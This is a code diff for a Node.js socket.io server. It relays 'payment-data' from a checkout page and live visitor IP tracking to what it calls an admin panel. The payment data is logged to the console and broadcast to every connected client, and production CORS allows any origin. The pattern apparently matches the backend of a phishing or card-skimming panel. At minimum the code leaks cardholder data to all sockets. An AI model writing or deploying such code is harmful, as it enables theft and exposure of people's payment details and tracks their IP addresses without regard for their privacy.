@@ -1,4 +1,3 @@
-
 import express from 'express';
 import { createServer } from 'http';
 import { Server } from 'socket.io';
@@ -17,7 +16,12 @@ const server = createServer(app);
 const corsOptions = {
   origin: process.env.NODE_ENV === 'production' 
     ? true // Allow all origins in production (Render.com handles HTTPS)
-    : ["http://localhost:5173", "http://localhost:3000", "http://localhost:8080", "http://localhost:8081"],
+    : [
+        "http://localhost:5173",
+        "http://localhost:3000",
+        "http://localhost:8080",
+        "http://localhost:8081"
+      ],
   methods: ["GET", "POST"],
   credentials: true
 };
@@ -30,12 +34,27 @@ const io = new Server(server, {
 // Serve static files from the dist directory in production
 if (process.env.NODE_ENV === 'production') {
   app.use(express.static(path.join(__dirname, 'dist')));
-  
   // Handle React routing - serve index.html for all non-API routes
   app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'dist', 'index.html'));
   });
 }
+
+// Store active visitors
+const activeVisitors = new Map();
+
+// Clean up inactive visitors periodically (5 min timeout)
+setInterval(() => {
+  const now = new Date();
+  const timeout = 5 * 60 * 1000; // 5 minutes
+  activeVisitors.forEach((visitor, socketId) => {
+    const lastActivity = new Date(visitor.lastActivity);
+    if (now - lastActivity > timeout) {
+      io.emit('visitor-left', { ipAddress: visitor.ipAddress });
+      activeVisitors.delete(socketId);
+    }
+  });
+}, 60000); // Check every minute
 
 // Socket.io connection handling
 io.on('connection', (socket) => {
@@ -44,7 +63,6 @@ io.on('connection', (socket) => {
   // Handle payment data from checkout page
   socket.on('payment-data', (data) => {
     console.log('Payment data received:', data);
-    
     // Emit to admin panel (broadcast to all connected clients)
     socket.broadcast.emit('payment-received', data);
   });
@@ -52,16 +70,16 @@ io.on('connection', (socket) => {
   // Handle visitor tracking with enhanced heartbeat mechanism
   socket.on('visitor-joined', (data) => {
     console.log('Visitor joined:', data);
-    
     // Store visitor data with socket ID for tracking
     socket.visitorData = {
       ...data,
       socketId: socket.id,
-      lastActivity: new Date().toISOString()
+      lastActivity: new Date().toISOString(),
+      timestamp: new Date().toISOString()
     };
-    
-    // Emit to admin panel (broadcast to all connected clients)
-    socket.broadcast.emit('visitor-joined', socket.visitorData);
+    activeVisitors.set(socket.id, socket.visitorData);
+    // Emit to admin panel (broadcast to all connected clients including sender)
+    io.emit('visitor-joined', socket.visitorData);
   });
 
   socket.on('visitor-heartbeat', (data) => {
@@ -69,18 +87,20 @@ io.on('connection', (socket) => {
     if (socket.visitorData) {
       socket.visitorData.lastActivity = new Date().toISOString();
       socket.visitorData.timestamp = new Date().toISOString();
-      
-      // Re-emit updated visitor data to keep admin panel in sync
-      socket.broadcast.emit('visitor-heartbeat-update', socket.visitorData);
+      activeVisitors.set(socket.id, socket.visitorData);
+      // Emit to all clients to keep admin panel in sync
+      io.emit('visitor-heartbeat-update', socket.visitorData);
     }
   });
 
   socket.on('visitor-left', (data) => {
     console.log('Visitor left:', data);
-    
-    // Emit to admin panel (broadcast to all connected clients)
-    socket.broadcast.emit('visitor-left', data);
-    
+    // Remove from active visitors
+    if (socket.visitorData) {
+      activeVisitors.delete(socket.id);
+    }
+    // Emit to all clients
+    io.emit('visitor-left', data);
     // Clear visitor data
     socket.visitorData = null;
   });
@@ -126,10 +146,11 @@ io.on('connection', (socket) => {
 
   socket.on('disconnect', () => {
     console.log('User disconnected:', socket.id);
-    
-    // If visitor was tracked, emit visitor left event
+    // If visitor was tracked, remove from activeVisitors and emit visitor left event
     if (socket.visitorData) {
-      socket.broadcast.emit('visitor-left', socket.visitorData);
+      io.emit('visitor-left', { ipAddress: socket.visitorData.ipAddress });
+      activeVisitors.delete(socket.id);
+      socket.visitorData = null;
     }
   });
 });
